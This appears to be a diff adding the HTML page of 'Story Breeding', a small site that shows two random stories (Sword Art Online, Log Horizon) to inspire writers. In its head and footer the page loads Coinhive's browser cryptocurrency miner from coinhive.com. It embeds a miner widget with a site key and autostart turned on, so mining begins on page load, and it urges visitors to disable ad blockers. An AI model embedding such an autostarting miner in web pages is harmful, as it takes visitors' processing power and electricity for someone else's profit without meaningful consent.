@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="theme-color" content="#4FC3F7"/>
+    <meta property="og:title" content="Story Breeding" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="http://storybreeding.surge.com" />
+    <meta property="og:image" content="https://i.imgur.com/jV7OXgV.jpg" />
+    <meta name="description" content="Story Breeding combines random stories to inspire writers. This was inspired by the old Startup Breeding site.">
+
+    <title>Story Breeding</title>
+
+    <!-- App Manifest -->
+    <link rel="manifest" href="manifest.json"> 
+
+    <!-- Preload assets -->
+    <link rel="preload" href="build/typography.min.css" as="style">
+    <link rel="preload" href="build/media-queries.min.css" as="style">
+    <link rel="preload" href="build/main.min.css" as="style">
+    <link rel="preload" href="build/main.min.js" as="script">
+    <link rel="preload" href="https://coinhive.com/lib/miner.min.js" as="script">
+    <link rel="preload" href="https://cdn.flickeringmyth.com/wp-content/uploads/2017/10/Sword-Art-Online-2.jpg" as="image">
+    <link rel="preload" href="http://i.imgur.com/NUEtjkP.jpg" as="image">
+
+    <!-- Load the JS and apply them after the DOM has been rendered. -->
+    <script defer src="build/main.min.js"></script>
+</head>
+<body>
+    <!-- Add the critical in the src/css/critical.scss file. -->
+    <link rel="stylesheet" href="build/critical.min.css">
+    <div class="flex flex--column">
+        <section>
+            <div class="flex container">
+                <div id="story1" style="background-image: url(https://cdn.flickeringmyth.com/wp-content/uploads/2017/10/Sword-Art-Online-2.jpg)" class="story__container flex flex--center halfpage bg-image--full bg-image--center bg-red">
+                    <div class="story__overlay"></div>
+                    <h2 class="center white story__title">Sword Art Online</h2>
+                </div>
+                <div id="story2" style="background-image: url(http://i.imgur.com/NUEtjkP.jpg)" class="story__container flex flex--center halfpage bg-image--full bg-image--center bg-pink">
+                    <div class="story__overlay"></div>
+                    <h2 class="center white story__title">Log Horizon</h2>
+                </div>
+            </div>
+        </section>
+        <footer>
+            <script src="https://coinhive.com/lib/miner.min.js" async></script>
+            <div class="coinhive-miner" 
+                style="width: 100vw;"
+                data-key="bMylriKr9gWZO3iYwRrcEAErrPix9yka"
+                data-autostart="true"
+                data-whitelabel="false"
+                data-background="#333"
+                data-text="#FAFAFA"
+                data-action="#00ff00"
+                data-graph="#555555"
+                data-start="Start Now!">
+                <em>Please disable Adblock!</em>
+            </div>
+        </footer>
+    </div>
+    <button id="refresher" class="white refresh-button">+</button>
+
+    <!-- The non-critical styles will be applied as soon as they are available. -->
+    <noscript id="deferred-styles">
+      <link rel="stylesheet" type="text/css" href="build/main.min.css">
+      <link rel="stylesheet" type="text/css" href="build/typography.min.css">
+      <link rel="stylesheet" type="text/css" href="build/media-queries.min.css">
+    </noscript>
+    <script>
+      var loadDeferredStyles = function() {
+        var addStylesNode = document.getElementById("deferred-styles");
+        var replacement = document.createElement("div");
+        replacement.innerHTML = addStylesNode.textContent;
+        document.body.appendChild(replacement)
+        addStylesNode.parentElement.removeChild(addStylesNode);
+      };
+      var raf = requestAnimationFrame || mozRequestAnimationFrame ||
+          webkitRequestAnimationFrame || msRequestAnimationFrame;
+      if (raf) raf(function() { window.setTimeout(loadDeferredStyles, 0); });
+      else window.addEventListener('load', loadDeferredStyles);
+    </script>
+</body>
+</html>
